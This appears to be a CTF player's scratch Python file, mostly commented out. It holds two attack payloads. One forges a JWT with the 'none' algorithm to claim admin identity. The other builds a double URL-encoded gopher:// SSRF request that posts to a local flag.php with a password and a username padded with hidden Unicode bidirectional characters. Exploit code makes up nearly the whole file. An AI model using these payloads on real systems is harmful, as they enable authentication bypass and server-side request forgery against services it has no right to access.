# # -*- coding: utf-8 -*-
# # import jwt
# # token = jwt.encode(
# # {
# #     "iss": "admin",
# #     "iat": 1678364239,
# #     "exp": 1678371439,
# #     "nbf": 1678364239,
# #     "sub": "admin",
# #     "jti": "2f830500868544caaaed4e9e996d921d"
# # },
# # algorithm="none",key=""
# # )

# # print(token)
# # print(1)
# import urllib.parse 
# payload =\
# """POST /flag.php?passwd=12345 HTTP/1.1
# Host: 127.0.0.1:80
# Content-Length: 31
# Content-Type: application/x-www-form-urlencoded

# username=admin‮⁦admin⁩⁦
# """  
# tmp = urllib.parse.quote(payload)
# new = tmp.replace('%0A','%0D%0A')
# result = 'gopher://127.0.0.1:80/'+'_'+new
# result = urllib.parse.quote(result)
# print(result)       # 因为是GET请求所以要进行两次url编码
sleep(600)
print(1)